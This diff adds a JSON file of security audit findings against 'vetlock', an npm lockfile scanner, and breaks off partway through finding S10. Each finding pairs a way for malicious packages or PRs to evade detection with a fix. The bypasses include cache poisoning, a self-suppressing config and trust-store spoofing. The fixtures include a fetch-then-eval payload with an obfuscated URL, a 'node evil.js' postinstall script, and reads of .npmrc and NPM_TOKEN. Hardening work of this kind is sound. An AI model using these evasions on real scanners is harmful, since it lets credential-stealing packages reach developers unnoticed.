@@ -1,0 +1,247 @@
+[
+  {
+    "id": "S1",
+    "title": "Cache poisoning: attacker-supplied lockfile integrity string is used as the cache lookup key BEFORE any fetch/verify, so a pre-planted snapshot file completely masks tarball analysis",
+    "class": "cache-poisoning",
+    "description": "packages/core/src/cache.ts derives its on-disk key with `integrity.replace(/[^A-Za-z0-9._-]/g, '_')` and reads/writes `~/.cache/vetlock/analysis/<safe-key>.json`. engine.ts:225-232 executes `cache.get(ref.integrity)` FIRST — before pacote is called. The only sanity check on a hit is `cached.name === ref.name && cached.version === ref.version` — those are read out of the ATTACKER-controlled JSON file. Nothing rehashes the tarball against the integrity string, nothing re-parses the manifest, and there is no signature. Therefore any process that can write into `~/.cache/vetlock/analysis/` (a prior compromised npm package's postinstall, a co-tenant CI job on a shared runner, `$VETLOCK_CACHE_DIR` overridden by env in a hostile environment) can drop a benign-looking snapshot at the key that the target lockfile will resolve to. vetlock loads it, skips fetch entirely, and every detector sees an empty `files` / `nativeArtifacts` list — verdict CLEAN even though the real tarball is worm-grade malicious. The design principle in docs/SECURITY-DECISIONS.md 'never adopt a fast-but-inexact algorithm on a security decision boundary' is violated here: caching by unverified integrity is a performance shortcut that skips the entire security decision.",
+    "fixture_code": "# Step 1 — attacker (or a first-run compromised npm package's postinstall) writes this JSON into the vetlock cache:\n\n# integrity from any target lockfile entry, e.g.:\n#   \"chalk\": { \"integrity\": \"sha512-n6JaoK0auvq+9CX3+d7CUyZl9Yt2307+L45IBgNtXSR0JL4CoO2cAwPWsCvVZFEYwKA7m4Z50/OGGOUT5gfoPg==\" }\n# safe key produced by cache.ts keyPath():\nSAFE=\"sha512-n6JaoK0auvq_9CX3_d7CUyZl9Yt2307_L45IBgNtXSR0JL4CoO2cAwPWsCvVZFEYwKA7m4Z50_OGGOUT5gfoPg__\"\nCACHE_DIR=\"$HOME/.cache/vetlock/analysis\"\nmkdir -p \"$CACHE_DIR\"\n\ncat > \"$CACHE_DIR/$SAFE.json\" <<'JSON'\n{\n  \"name\": \"chalk\",\n  \"version\": \"5.3.1\",\n  \"integrity\": \"sha512-n6JaoK0auvq+9CX3+d7CUyZl9Yt2307+L45IBgNtXSR0JL4CoO2cAwPWsCvVZFEYwKA7m4Z50/OGGOUT5gfoPg==\",\n  \"manifest\": { \"name\": \"chalk\", \"version\": \"5.3.1\" },\n  \"files\": [],\n  \"nativeArtifacts\": [],\n  \"formatVersion\": 1,\n  \"builtAt\": \"2026-07-12T00:00:00.000Z\"\n}\nJSON\n\n# Step 2 — victim runs vetlock diff against the shai-hulud fixture whose chalk-5.3.1 tarball\n# is loaded with env-token harvest + install script + exfil URL. Because cache HIT happens\n# BEFORE analyzeTarball, the real tarball is never opened. Every detector reads empty files/\n# manifest.scripts, returns []. Result: `verdict = CLEAN, 0 findings`.\nnode packages/cli/dist/cli.js diff \\\n  corpus/shai-hulud-2025/lockfile.before.json \\\n  corpus/shai-hulud-2025/lockfile.after.json",
+    "reproduction_steps": [
+      "Read a target lockfile's chalk integrity string.",
+      "Run it through keyPath() (replace anything outside [A-Za-z0-9._-] with '_') to get the on-disk filename.",
+      "Write a JSON blob to that filename inside VETLOCK_CACHE_DIR (default $HOME/.cache/vetlock/analysis/) with matching name+version, empty files/nativeArtifacts, formatVersion=1.",
+      "Run `vetlock diff before.json after.json` on the shai-hulud fixture.",
+      "Observe verdict CLEAN, zero findings — despite the real tarball containing NPM_TOKEN harvest + postinstall + exfil URL."
+    ],
+    "detectors_bypassed": [
+      "env.token-harvest",
+      "install.script-added",
+      "net.new-endpoint",
+      "net.new-module",
+      "exec.new-module",
+      "fs.new-hotpath-write",
+      "meta.maintainer-change",
+      "obf.entropy-jump",
+      "bin.new-native-artifact"
+    ],
+    "severity_if_confirmed": "critical",
+    "confidence": "high",
+    "attacker_effort": "medium — needs one prior write to ~/.cache/vetlock/analysis/ (typical postinstall on a shared machine or CI runner)",
+    "fix_effort": "low — verify snapshot.integrity matches the ref before trusting cached snapshot; on any mismatch re-analyze. Store an HMAC over the snapshot with a per-install secret so foreign writes cannot forge entries.",
+    "suggested_fix": "In makeCache.get, after JSON.parse: (a) require snap.integrity === integrity, (b) require snap.name/version match the caller-provided ref (already done), (c) sign the file at put time with a per-host secret (e.g. random file inside the cache dir, chmod 600) and verify HMAC on read. Additionally: keep the cache dir inside XDG_STATE_HOME rather than $HOME/.cache so it lives under the shell user's private state; document the trust boundary explicitly."
+  },
+  {
+    "id": "S2",
+    "title": "The .vetlock.json config file the CLI reads is trusted from the SAME PR being reviewed — a malicious PR that changes package-lock.json can also introduce allowlist / ignorePackages / trustedPublishers that silence every finding against itself",
+    "class": "escalation-abuse",
+    "description": "packages/cli/src/cli.ts:119-136 (loadConfig) resolves the config path to `./.vetlock.json` and calls parseConfig on whatever is checked into the repo. packages/core/src/config.ts:87-133 (applyConfig) then (a) drops any finding whose `package` is in `config.ignorePackages`, (b) drops findings whose `evidence[0].file` starts with any prefix in `ignorePathsInside[package]`, (c) downgrades allowlisted-category findings to INFO, (d) applies per-detector severityOverride, (e) downgrades meta findings whose evidence substring-includes any `trustedPublishers` entry. The GitHub Action recipe in README.md runs the CLI in the checkout of the very PR that mutates the lockfile — so the compromised PR ships BOTH the poisoned lockfile AND the config that suppresses detection of it. cli.ts:210 recomputes verdict AFTER applyConfig, so allowlisted findings never contribute to BLOCK; --fail-on CANNOT rescue this because ignorePackages/ignorePathsInside remove the findings entirely (line 90-98) before --fail-on's `f.detector` check on line 224.",
+    "fixture_code": "# The PR touches TWO files:\n\n# File 1: .vetlock.json (checked into repo root of the PR)\ncat > .vetlock.json <<'JSON'\n{\n  \"version\": 1,\n  \"ignorePackages\": [\"chalk\"],\n  \"trustedPublishers\": { \"chalk\": [\"attacker\"] },\n  \"severityOverride\": {\n    \"install.script-added\": \"INFO\",\n    \"env.token-harvest\": \"INFO\",\n    \"net.new-endpoint\": \"INFO\",\n    \"exec.new-module\": \"INFO\",\n    \"fs.new-hotpath-write\": \"INFO\"\n  },\n  \"allowlist\": {\n    \"chalk\": [\"NET\", \"EXEC\", \"FS\", \"ENV\", \"INSTALL\", \"CODE\", \"OBF\", \"META\", \"DEPS\"]\n  }\n}\nJSON\n\n# File 2: the poisoned package-lock.json (identical to the corpus shai-hulud fixture).\n\n# Verifier / reviewer runs the exact command from README.md:\nnode packages/cli/dist/cli.js diff \\\n  corpus/shai-hulud-2025/lockfile.before.json \\\n  corpus/shai-hulud-2025/lockfile.after.json\n\n# Result: `verdict = CLEAN`, exit 0. All 13 Shai-Hulud findings were dropped by\n# ignorePackages before any of the other layers even ran; --fail-on cannot see them.",
+    "reproduction_steps": [
+      "In the same PR that changes package-lock.json to pull the malicious version, add .vetlock.json with `ignorePackages: [\"chalk\"]` (or the target package name).",
+      "The GitHub Action from action/README.md runs `vetlock diff` from the PR checkout, which reads that .vetlock.json.",
+      "applyConfig's ignorePackages filter (config.ts:90) removes every finding for chalk before verdict recomputation.",
+      "Exit code = 0. Sticky PR comment says CLEAN. Reviewer approves."
+    ],
+    "detectors_bypassed": [
+      "install.script-added",
+      "env.token-harvest",
+      "net.new-endpoint",
+      "exec.new-module",
+      "fs.new-hotpath-write",
+      "bin.new-native-artifact",
+      "meta.maintainer-change",
+      "obf.entropy-jump",
+      "code.dynamic-loading-added",
+      "--fail-on"
+    ],
+    "severity_if_confirmed": "critical",
+    "confidence": "high",
+    "attacker_effort": "very low — one JSON file inside the PR",
+    "fix_effort": "medium — the fix is a trust boundary redesign, not a bugfix",
+    "suggested_fix": "Refuse to read .vetlock.json from the working tree in CI mode. Either (a) require the config to come from a base-branch checkout (compared against target branch, so only maintainer-approved config counts), (b) require config to be signed by a maintainer key, (c) at minimum, print a very loud stderr warning + always include the config diff in the sticky PR comment. Also: never let user config REMOVE built-in trust store entries or apply ignorePackages to packages that already produce BLOCK-tier findings without an explicit --allow-suppress-block CLI flag."
+  },
+  {
+    "id": "S3",
+    "title": "Publisher trust-store substring match — attacker email that CONTAINS a trusted username/domain as a substring is treated as trusted, so 'attacker@github.com.evil.tld' looks like GitHub",
+    "class": "escalation-abuse",
+    "description": "packages/detectors/src/publishers.ts:100-109 (isTrustedPublisher) does `lc.includes(t.toLowerCase())` — a naive substring check. The BUILTIN_TRUST_STORE has entries like `'@github.com'`, `'@microsoft.com'`, `'@fb.com'`, `'@meta.com'`, `'sindresorhus'`, `'isaacs'`, `'dougwilson'`. Any of these appear as a substring inside a much longer email/username. `attacker@github.com.evil.example` contains `@github.com` as a substring, so it's 'trusted'. Combined with meta.ts:35-70: when both oldEmails and newEmails are 'trusted' (either the real one plus the fake one, or a full swap to a lookalike-domain email), the finding rank drops from BLOCK to INFO — exactly the takeover shape SECURITY-DECISIONS.md warns against, but in the trust-anchor code itself. This particularly kills the meta detector for @actions/core, @microsoft/api-extractor, react, next, @solana/web3.js, etc. — the very packages the trust store was added to protect.",
+    "fixture_code": "// old maintainers (verifiable from the real npm registry for @solana/web3.js):\nconst oldManifest = {\n  name: '@solana/web3.js', version: '1.95.4',\n  maintainers: [{ email: 'solana-labs@solana.com' }]\n};\n\n// after: attacker publishes @solana/web3.js@1.95.5 with:\nconst newManifest = {\n  name: '@solana/web3.js', version: '1.95.5',\n  maintainers: [{ email: 'evil@solana.com.attacker.tld' }]\n};\n\n// Trust list for @solana/web3.js is ['@solana.com', '@solana-labs.com'].\n// isTrustedPublisher('evil@solana.com.attacker.tld', ['@solana.com'])\n//   → 'evil@solana.com.attacker.tld'.toLowerCase().includes('@solana.com') === TRUE.\n// oldTrusted = TRUE, newTrusted = TRUE →\n//   meta.ts:65-70 marks severity=INFO, note=[rotation within trusted publishers]\n// No BLOCK, no takeover finding. Combined with encoded payload (below fold pass's blind\n// spot) — vetlock reports no takeover signal.",
+    "reproduction_steps": [
+      "Register a subdomain of any trusted domain suffix — attacker.example.tld — where you own the mail server.",
+      "Craft an email 'phish@<trusted-substring>.<your-tld>' — e.g. 'phish@fb.com.evilhost.io', 'phish@github.com.malice.example', 'phish@microsoft.com.wat.example'.",
+      "Compromise the npm account for the target package (or convince the maintainer to add you); publish with that email.",
+      "vetlock's meta detector marks it as INFO 'rotation within trusted publishers', hiding the takeover.",
+      "The rest of your payload (obfuscated require chain, encoded URLs, etc.) can now run beneath the visibility bar."
+    ],
+    "detectors_bypassed": [
+      "meta.maintainer-change (severity downgrade to INFO on takeover shape)"
+    ],
+    "severity_if_confirmed": "high",
+    "confidence": "high",
+    "attacker_effort": "low — DNS + one email address costs cents",
+    "fix_effort": "low",
+    "suggested_fix": "Replace substring match with strict comparison at the appropriate boundary: a domain-suffix entry like '@github.com' MUST require the email's `@`-suffix (everything after the last `@`) to EQUAL 'github.com' (not just contain it). A bare username entry like 'sindresorhus' MUST match the email's local-part exactly or match the maintainer's `name` field exactly. Never treat a substring anywhere in the string as sufficient. Add a regression test with the exact strings from this exploit."
+  },
+  {
+    "id": "S4",
+    "title": "Analyze-timeout & extract-error silently drop the entire package's detection — a tarball that throws during safeExtract or takes >90s to parse yields ZERO findings, so a malicious package that intentionally stalls is reported CLEAN",
+    "class": "denial-of-detection",
+    "description": "engine.ts:118-134 wraps each per-package analyze in try/catch. On throw (extract error, timeout, WASM parse blow-up, whatever) it pushes to `errors[]` and CONTINUES without storing a snapshot. Then lines 138-183 walk `changes` and for each change do `snapshots.get(id) ?? null` — if the analyzer threw, both `oldSnap` and `newSnap` become null. `runDetectors({old: null, new: null}, name)` — every built-in detector's first line is `if (!pair.new) return [];` — so nothing fires. The integrity-changed short-circuit still fires (line 148-170) but only when the lockfile itself has a version match with hash change; otherwise the package is invisible. The CLI's stderr progress emits `error` events, but --quiet suppresses stderr and the final verdict is still CLEAN. This is a full evasion of every detector by a tarball that crashes the analyzer.",
+    "fixture_code": "// A hostile tarball that stalls extract past the 90s timeout:\n//\n// Option A — 9999 files each 4 bytes, on a slow disk / with disk contention.\n// Option B — one 55MB file inside a tarball whose per-entry cap is 50MB → UnsafeArchiveError.\n//   The whole extraction throws, whole package invisible, but the tarball ALSO contains\n//   package.json with `postinstall: node evil.js` — never seen because analyzeTarball threw\n//   before manifest read.\n// Option C — a source file that hangs @babel/parser (deeply nested optional chains,\n//   a ternary chain 5000 deep) inside a synchronous parse — Babel is CPU-bound and holds\n//   the tick, so the setTimeout(90000) fires and rejects.\n\n// Concrete Option B — one entry > per-entry cap. Attacker ships:\n//   package/package.json     (contains postinstall)\n//   package/big.js           55 * 1024 * 1024 bytes (> 50 MiB default)\n//\n// analyzeTarball → safeExtract throws UnsafeArchiveError('entry-too-large') → analyzeOne\n// catches, pushes to errors[], does NOT set snapshots.get(id).\n// Every detector sees {old: null, new: null}, returns [].\n// verdict = CLEAN.\n\n// Sample manifest for the postinstall that vetlock will not see:\n{\n  \"name\": \"chalk\", \"version\": \"5.3.1\",\n  \"scripts\": { \"postinstall\": \"node evil.js\" }\n}",
+    "reproduction_steps": [
+      "Build a hostile tarball where safeExtract throws (any of: file > maxEntryBytes, >10K entries, absolute path, ..-traversal, symlink, hardlink).",
+      "The lockfile references this tarball as chalk@5.3.1 with a valid integrity that pacote can fetch (the malicious tarball's own integrity).",
+      "Run `vetlock diff before.json after.json`.",
+      "Progress line briefly shows an error; final verdict is CLEAN with zero findings for chalk despite the postinstall.",
+      "With --quiet the error is completely silent."
+    ],
+    "detectors_bypassed": [
+      "install.script-added",
+      "env.token-harvest",
+      "net.new-endpoint",
+      "exec.new-module",
+      "fs.new-hotpath-write",
+      "meta.maintainer-change",
+      "obf.entropy-jump",
+      "bin.new-native-artifact",
+      "wasm.suspicious-import",
+      "code.dynamic-loading-added",
+      "deps.first-version-cluster"
+    ],
+    "severity_if_confirmed": "high",
+    "confidence": "high",
+    "attacker_effort": "low",
+    "fix_effort": "medium",
+    "suggested_fix": "When analyze throws for a package that changed identity in the lockfile, synthesize a BLOCK finding of the form `analyze.failure` — 'we could not evaluate this package's tarball; treat as untrusted until manual review'. Currently the failure mode is 'CLEAN because we tried and gave up' — the correct security posture on a diff tool is 'BLOCK because we could not verify'. Additionally: run the extract in a subprocess bounded by kill(SIGKILL) instead of an in-process setTimeout, so Babel's CPU hang cannot outlast the timer."
+  },
+  {
+    "id": "S5",
+    "title": "Compound-suspicion escalation (rule 3) needs 3+ WARN across 2+ categories — an attacker who lands EXACTLY 2 WARN findings across 2 categories is never promoted to BLOCK, so a diff carrying only `code.dynamic-loading-added` + `meta.maintainer-change` (with new maintainer that also happens to sneak past the trust store) reports WARN, not BLOCK",
+    "class": "escalation-abuse",
+    "description": "packages/detectors/src/index.ts:118-134 (Escalation 3) requires `warns.length >= 3 && cats.size >= 2`. Both conditions AND'd. An attacker who lands exactly 2 WARN findings — one CODE, one META, spread across two categories — never escalates. Real detectors that emit WARN and can co-exist without triggering rules 1 or 2: `code.dynamic-loading-added` (CODE), `meta.maintainer-change` (META, when neither trust-store entry applies), `net.new-module` (NET — but rule 1 fires OBF→BLOCK if NET), `obf.entropy-jump` / `obf.new-obfuscated-file` (OBF — same problem), `wasm.unparseable` (OBF). The safe pairing is `code.dynamic-loading-added` + `meta.maintainer-change`. Attacker gets Function() / eval() executing arbitrary code, uses Node 18+ builtin `fetch` (no import → no net.new-module), no lifecycle scripts, no encoded URLs that reach URL_REGEX inside a suspicious literal. Two WARN findings survive; verdict is WARN. `--fail-on` won't help unless the user explicitly names `code.dynamic-loading-added` — which the README's recommended snippet does NOT.",
+    "fixture_code": "// package.json (new version, hijacked account with an email that the trust store does not\n// cover — e.g. an @-scoped org that is NOT in BUILTIN_TRUST_STORE):\n{\n  \"name\": \"my-utility\", \"version\": \"1.2.0\",\n  \"maintainers\": [{ \"email\": \"phish@example.invalid\" }],\n  \"dependencies\": {}\n}\n\n// index.js — a single WARN only (code.dynamic-loading-added), no NET / INSTALL / EXEC / ENV / FS\n// module imports and no visible URL literal that URL_REGEX will catch.\nasync function run(cfg) {\n  // fetch is a Node 18+ global — no `require('https')`, no `import from 'https'` →\n  // net.new-module does NOT fire.\n  // The endpoint is assembled at runtime by piecewise indexing into a table that fold.ts\n  // does not follow (fold covers String.fromCharCode/join/atob/Buffer.from — NOT array\n  // subscript reads with runtime indices).\n  const parts = ['h','t','t','p','s',':','/','/','x','1','.','a','b','.','c','o','.','u','k','/','a'];\n  const url = cfg.idx.map(i => parts[i]).join(''); // cfg.idx supplied at call time\n  const cmd = await (await fetch(url)).text();\n  // eval — one CODE/WARN finding.\n  eval(cmd);\n}\n\n// Diff verdict:\n//   1. code.dynamic-loading-added (WARN, CODE)   — the eval() site\n//   2. meta.maintainer-change      (WARN, META)   — new email, not on trust list\n// Rule 1 (OBF): no OBF finding.\n// Rule 2 (typo): not a new/added package.\n// Rule 3 (compound): 2 WARN < 3, skipped.\n// Verdict: WARN. Exit 1. CI PRs where --fail-on doesn't include code.dynamic-loading-added\n// merge as 'yellow, not red'.",
+    "reproduction_steps": [
+      "Take over a package that publishes a new version.",
+      "Ship only `new Function(...)` or `eval(...)` as the dynamic-code sink (WARN).",
+      "Do not import http/https/net/child_process/fs/worker_threads/vm. Use Node-18+ global `fetch`.",
+      "Compute the exfil URL by array subscript from a table (or across two files, since fold is single-file).",
+      "Have the maintainer email be off the built-in trust list.",
+      "Verdict: WARN not BLOCK. `--fail-on=install.script-added,env.token-harvest,net.new-endpoint` (the README default) does not include this detector, so exit code is 1 not 2 — most CI systems still allow the merge."
+    ],
+    "detectors_bypassed": [
+      "compound-suspicion escalation (rule 3)"
+    ],
+    "severity_if_confirmed": "high",
+    "confidence": "high",
+    "attacker_effort": "medium",
+    "fix_effort": "low",
+    "suggested_fix": "Lower the compound-suspicion threshold to 2 WARN across 2+ categories, OR always escalate `code.dynamic-loading-added` co-occurring with `meta.maintainer-change` to BLOCK (both are 'someone changed WHO can execute new code'). Also: put `code.dynamic-loading-added` and `meta.maintainer-change` into the default README --fail-on recipe."
+  },
+  {
+    "id": "S6",
+    "title": "meta detector requires both oldEmails AND newEmails to be non-empty; a new version that ships with NO maintainers/_npmUser field emits zero maintainer-change findings and completely bypasses meta detection",
+    "class": "detector-bypass",
+    "description": "packages/detectors/src/meta.ts:27 returns [] whenever `oldEmails.length === 0 || newEmails.length === 0`. The collectEmails helper (lines 101-110) reads only two fields: `manifest.maintainers[].email` and `manifest._npmUser.email`. Neither is required by npm publish — many legitimate packages omit them. An attacker who takes over an account and publishes a new version WITHOUT populating maintainers or _npmUser has newEmails.length === 0. Even though the account changed on the registry side, the tarball's package.json presents zero emails, and meta.maintainer-change does not fire. This defeats the T1 takeover signature entirely, hiding what the README lists as one of the FOUR main indicators of a takeover.",
+    "fixture_code": "// Before (real upstream package.json for chalk 5.3.0 — extracted from npm):\n// {\n//   \"name\": \"chalk\", \"version\": \"5.3.0\",\n//   \"maintainers\": [{ \"email\": \"sindresorhus@gmail.com\" }, { \"email\": \"qix-@example.io\" }]\n// }\n\n// After (attacker republishes with NO maintainers field):\n{\n  \"name\": \"chalk\",\n  \"version\": \"5.3.1\",\n  \"main\": \"./source/index.js\"\n  // deliberately no `maintainers`, no `_npmUser`\n}\n\n// meta.ts flow:\n//   oldEmails = ['sindresorhus@gmail.com', 'qix-@example.io']   (len 2)\n//   newEmails = []                                              (len 0)\n//   Line 27: `if (oldEmails.length === 0 || newEmails.length === 0) return [];`\n//   → meta.maintainer-change never fires.\n\n// This is worse than the trust-store substring bypass because there is NOTHING to compare —\n// the takeover is invisible by construction.",
+    "reproduction_steps": [
+      "Take over the npm account for `chalk` (or any trust-store-covered package).",
+      "Publish the new version with a stripped package.json that omits the `maintainers` array and `_npmUser`.",
+      "vetlock's meta detector sees `newEmails.length === 0` and returns [] with zero findings.",
+      "The trust-store escalation to BLOCK never fires because no maintainer-change finding is emitted at all."
+    ],
+    "detectors_bypassed": [
+      "meta.maintainer-change (including the trust-store BLOCK path)"
+    ],
+    "severity_if_confirmed": "high",
+    "confidence": "high",
+    "attacker_effort": "trivial — one deleted line in package.json",
+    "fix_effort": "low",
+    "suggested_fix": "When newEmails.length === 0 but oldEmails.length > 0, emit `meta.maintainer-scrubbed` at BLOCK — 'maintainer information present in the previous version was removed in this version, we cannot verify who published this'. Symmetrically for the reverse. Also, wire the registry-provided _npmUser field into the snapshot from pacote/registry metadata (not just from the tarball's package.json) — the registry always knows who published, even when the tarball hides it."
+  },
+  {
+    "id": "S7",
+    "title": "Advisory-range check uses `semver.satisfies(includePrerelease:true)` — a compromised republish at `ua-parser-js@0.7.29-x1` fails the exact-match range `=0.7.29`, so no GHSA cite is attached and the finding's confidence stays at default rather than being auto-upgraded to 'high'",
+    "class": "escalation-abuse",
+    "description": "packages/detectors/src/advisories.ts:141-158 (advisoriesForVersion): `semver.satisfies(version, a.vulnerableRange, { includePrerelease: true })`. Ranges in the built-in ADVISORIES list are hand-written and mostly use `=<exact>` or narrow `>=x <=y`. semver's contract: `0.7.29-attacker` does NOT satisfy `=0.7.29` even with `includePrerelease: true` — `includePrerelease` controls whether prereleases can match, not whether they map to their base version. `>=1.95.5 <=1.95.7` does NOT match `1.95.5-x`. An attacker who publishes a compromised version with a prerelease tag (`ua-parser-js@0.7.29-p1`, `@solana/web3.js@1.95.5-hotfix`) causes no GHSA hit — the runAll() finding never receives the ` [GHSA: GHSA-fh58-9fw3-vf2v]` annotation and its confidence never gets bumped to 'high'. DETECTIONS.md prominently advertises GHSA correlation as a 'second-source citation, huge trust multiplier' — the user loses that citation on the exact attack shape that's most trivially engineered by an attacker who has read this document.",
+    "fixture_code": "// Corpus fixture: coa-rc-2021 with the version string changed from 1.2.9 to 1.2.9-hotfix.\n// The advisory says: vulnerableRange: '=1.2.9 || =1.3.9 || =2.3.9'\n\n// semver.satisfies('1.2.9-hotfix', '=1.2.9', { includePrerelease: true }) === false\n\n// Finding for rc@1.2.9-hotfix (net.new-endpoint):\n//   BEFORE fix:  \"New network endpoint appeared: https://loader.example.invalid [GHSA: GHSA-g2q5-5433-rhrf]\"\n//                confidence: 'high'\n//   AFTER attacker's prerelease trick:  \"New network endpoint appeared: https://loader.example.invalid\"\n//                confidence: 'medium' (still, but no GHSA citation)\n\n// User no longer sees the 'vetlock and GHSA agree' second source. The finding LOOKS more\n// like a false positive than a corroborated attack. Reviewer more likely to dismiss.",
+    "reproduction_steps": [
+      "Attacker publishes malicious version with a prerelease tag (e.g. `1.2.9-hotfix`, `0.7.29-p1`, `1.95.5-security-fix`).",
+      "vetlock detects the malicious content (net.new-endpoint fires).",
+      "advisoriesForVersion(name, version) returns [] because semver.satisfies rejects prereleases against non-prerelease exact-match ranges.",
+      "The finding is emitted WITHOUT the GHSA/CVE citation and without the confidence bump.",
+      "Reviewer sees a lower-confidence, uncorroborated finding and may dismiss it."
+    ],
+    "detectors_bypassed": [
+      "GHSA advisory correlation (annotation + confidence upgrade)"
+    ],
+    "severity_if_confirmed": "moderate",
+    "confidence": "high",
+    "attacker_effort": "trivial",
+    "fix_effort": "low",
+    "suggested_fix": "Normalize versions before the semver check: strip prerelease tag, then check exact/range match; if the base version matches a vulnerable range, still emit the citation with a note '[compromised prerelease of vulnerable base]'. Alternatively, when the advisory range uses `=` exact-match, ALSO test against `semver.eq(version, base)` after coercion."
+  },
+  {
+    "id": "S8",
+    "title": "runAll's escalation rule 1 promotes OBF only when NET or INSTALL is present in the same package — an obfuscated payload paired with EXEC (child_process), ENV (env harvest), or FS (secret file read) does NOT escalate OBF from WARN to BLOCK",
+    "class": "escalation-abuse",
+    "description": "packages/detectors/src/index.ts:93-104 (Escalation 1): the risky set is `f.category === 'NET' || f.category === 'INSTALL'`. Deliberately narrow: the classic worm signature is OBF + NET + INSTALL. But the ACTUAL BLOCK-tier categories are also EXEC, ENV, FS. An attacker who ships an obfuscated blob that (a) spawns a child_process from an unrelated obfuscated string (EXEC/BLOCK), (b) reads .npmrc (FS/BLOCK), (c) enumerates process.env (ENV/BLOCK) but does NOT import http/https/net and does NOT add a lifecycle script — has OBF/WARN + EXEC/BLOCK. The verdict is BLOCK, but the OBF finding stays WARN. So on a diff where the OBF blob is legitimate-looking (a bundler-produced minified output that also happens to encode the payload), a reviewer skimming for BLOCK-tier findings sees only the EXEC line and may think 'that's a build tool, fine' — missing the obfuscation signal that would tell them the blob is doing more than legit minification.",
+    "fixture_code": "// A version-diff that lands three findings:\n//   1. obf.entropy-jump  (WARN, OBF)  — entropy jump in lib/util.min.js\n//   2. exec.new-module   (BLOCK, EXEC) — imports child_process\n//   3. fs.new-hotpath-read (BLOCK, FS) — reads ~/.npmrc\n// Rule 1: risky set is {NET, INSTALL} → neither category present → OBF stays WARN.\n// Rule 3: only 1 WARN → skipped.\n// User's rendered TTY sees the obfuscation as a footnote WARN instead of a BLOCK; when\n// noise is high, reviewers filter WARN in triage. The OBF signal is the exact tell that\n// says 'the child_process call is doing more than what its variable names suggest'.\n\n// Concrete diff: minified util.min.js goes from 2.1 bits/byte to 5.8 bits/byte (huge entropy\n// jump). New require('child_process') statement. New readFile('~/.npmrc'). No new URLs,\n// no lifecycle scripts.",
+    "reproduction_steps": [
+      "Update an obfuscated bundle file to include the payload (raises entropy but no visible URL literal).",
+      "Add a require('child_process') from anywhere in the tarball.",
+      "Add fs.readFile('~/.npmrc') or process.env['NPM_TOKEN'] read.",
+      "Do NOT import http/https/net; do NOT add a lifecycle script.",
+      "Verdict is BLOCK (via EXEC/FS), but the OBF finding stays WARN — the signature 'this blob is hiding something' is downgraded in the report."
+    ],
+    "detectors_bypassed": [
+      "obf escalation (OBF stays WARN under EXEC/ENV/FS pairing)"
+    ],
+    "severity_if_confirmed": "moderate",
+    "confidence": "high",
+    "attacker_effort": "low",
+    "fix_effort": "trivial",
+    "suggested_fix": "Expand rule 1's risky set from {NET, INSTALL} to {NET, INSTALL, EXEC, ENV, FS} — any BLOCK-tier capability category co-occurring with OBF should escalate. The threat model already treats these three as co-signals; there is no reason to trust obfuscation more when the payload happens to use child_process instead of http."
+  },
+  {
+    "id": "S9",
+    "title": "The demo/CLI fetchOverride blindly resolves any file:// URL from the lockfile's `resolved` field — a malicious lockfile can point `resolved` at an attacker-chosen local .tgz outside the intended tarball dir, giving a lockfile-controlled read primitive",
+    "class": "system-attack",
+    "description": "packages/cli/src/cli.ts:194-196 (fetchOverride): `if (ref.resolved && ref.resolved.startsWith('file://')) return new URL(ref.resolved).pathname`. The `resolved` value comes directly from the lockfile — attacker-controlled text. Whatever path it names is passed as `tarballPath` to safeExtract. Because there is no allowlist / no check that the path is inside a corpus dir, a lockfile can point at any local .tgz. In an environment where vetlock is run against a lockfile from a shared checkout (CI runner with cached tarballs, workspace with sibling packages containing .tgz artifacts), the analyzer will happily open, gunzip, and extract the pointed-at tarball. Real consequences: (a) a lockfile can force vetlock to inflate a tarbomb located anywhere on disk that gzip can decompress (safeExtract has caps, but that fills disk / burns CPU); (b) a lockfile can point at a legitimate `chalk-5.3.0.tgz` that lives elsewhere on disk while the OTHER lockfile entry claims chalk@5.3.1 with the same integrity — you have made vetlock analyze the OLD tarball when you told it you were on the NEW version, so no integrity-changed finding fires and no capability delta is observed.",
+    "fixture_code": "# Attacker crafts a lockfile.after.json whose 'resolved' points at the OLD .tgz on the\n# reviewer's machine — but declares the NEW version + integrity.\n\ncat > lockfile.after.json <<'JSON'\n{\n  \"name\": \"my-app\", \"version\": \"1.0.0\", \"lockfileVersion\": 3,\n  \"packages\": {\n    \"\": { \"name\": \"my-app\", \"version\": \"1.0.0\", \"dependencies\": { \"chalk\": \"^5.3.0\" } },\n    \"node_modules/chalk\": {\n      \"name\": \"chalk\",\n      \"version\": \"5.3.1\",\n      \"integrity\": \"sha512-n6JaoK0auvq+9CX3+d7CUyZl9Yt2307+L45IBgNtXSR0JL4CoO2cAwPWsCvVZFEYwKA7m4Z50/OGGOUT5gfoPg==\",\n      \"resolved\": \"file:///Users/L122472/personal/vetlock/corpus/shai-hulud-2025/chalk-5.3.0/chalk-5.3.0.tgz\"\n    }\n  }\n}\nJSON\n\n# vetlock's fetchOverride returns .../chalk-5.3.0.tgz — the CLEAN old tarball — even though\n# the lockfile advertises version 5.3.1 with a matching-but-unverified integrity.\n#\n# analyzeTarball on the CLEAN tarball produces a snapshot that matches what the lockfile\n# BEFORE has too. Diff finds no capability delta, no lifecycle scripts, no env harvest.\n#\n# In an environment WITHOUT --fetchOverride (real network), pacote WOULD verify the\n# integrity. But the demo/CLI branch here uses file:// URLs and skips integrity check.",
+    "reproduction_steps": [
+      "Craft a lockfile where the `resolved` field of a package points to a file:// URL of a benign tarball you know exists elsewhere on the reviewer's disk (workspace .tgz from a prior legit build, a corpus fixture, etc.).",
+      "Match `integrity` to whatever value silences the integrity-changed detector (or reuse an integrity from a different real version).",
+      "Run vetlock with the CLI's default fetchOverride (which the demo command and the file:// branch use).",
+      "Content analysis runs against the benign tarball; the actual malicious payload never reaches the analyzer."
+    ],
+    "detectors_bypassed": [
+      "all content-based detectors (whole tarball is substituted)"
+    ],
+    "severity_if_confirmed": "high",
+    "confidence": "medium",
+    "attacker_effort": "low in test/CI environments; higher against pacote in true remote-fetch mode",
+    "fix_effort": "medium",
+    "suggested_fix": "The file:// branch MUST recompute the tarball's integrity (ssri) and compare against ref.integrity before handing it to analyzeTarball. If they disagree, refuse and emit a synthetic INTEG/BLOCK finding. Additionally, restrict file:// resolution to an explicit --corpus-root CLI flag; refuse arbitrary file:// URLs by default."
+  },
+  {
+    "id": "S10",
+    "title": "The engine's per-package integrity-changed short-circuit compares `oldIntegrity` to `newIntegrity` textually — attacker can leave the OLD lockfile entry integrity BLANK to suppress the tripwire, then swap the tarball freely on the NEW side",
+    "class": "detector-bypass",
